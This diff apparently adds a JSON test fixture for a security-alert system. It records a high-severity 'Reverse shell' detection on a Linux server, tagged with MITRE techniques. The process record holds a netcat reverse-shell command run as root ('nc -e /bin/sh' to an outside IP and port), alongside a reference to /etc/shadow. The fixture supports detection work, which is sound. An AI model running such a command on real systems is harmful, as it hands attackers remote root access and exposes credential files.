@@ -1,0 +1,62 @@
+{
+  "id": "0b6f9a1e-5c43-4f0e-8d2a-7e1b3c5d9f20",
+  "device_id": "6f1c2a8e-0b7d-4e44-9a51-3c2d7e9f0a11",
+  "hostname": "srv-01.example.com",
+  "device_os": "linux",
+  "title": "Reverse shell",
+  "severity": "high",
+  "source": "detection",
+  "status": "new",
+  "policy_id": "PROD-reverse-shell",
+  "mitre": [
+    "T1059.004",
+    "T1071",
+    "TA0011",
+    "bogus"
+  ],
+  "observed_at": "2026-11-12T10:00:00Z",
+  "first_seen": "2026-11-12T10:00:00Z",
+  "last_seen": "2026-11-12T10:00:00Z",
+  "case_id": null,
+  "category": null,
+  "resolution": null,
+  "closed_at": null,
+  "external_id": "18df7e55-7",
+  "group_key": "policy:PROD-reverse-shell",
+  "event_id": "9a7c1d2e3f405162",
+  "created_at": "2026-11-12T10:00:02.123456Z",
+  "updated_at": "2026-11-12T10:00:02.123789Z",
+  "detection": {
+    "process": {
+      "pid": 4242,
+      "ppid": 1,
+      "guid": "1a2b3c4d:4242:987654",
+      "path": "/usr/bin/nc",
+      "cmdline": "nc -e /bin/sh 192.0.2.9 4444",
+      "user": "root",
+      "uid": "0",
+      "start": 1762941600,
+      "sha256": "abababababababababababababababababababababababababababababababab"
+    },
+    "parent": {
+      "pid": 1,
+      "guid": "1a2b3c4d:1:12",
+      "path": "/usr/bin/bash",
+      "cmdline": "bash -i"
+    },
+    "file": {
+      "path": "/etc/shadow"
+    },
+    "threat": {
+      "source": "rules",
+      "rule_id": "PROD-reverse-shell"
+    },
+    "ml": {
+      "score": 0.987654,
+      "band": "block",
+      "model": "pe-2",
+      "mode": "alert",
+      "engine_verdict": "allowed"
+    }
+  }
+}
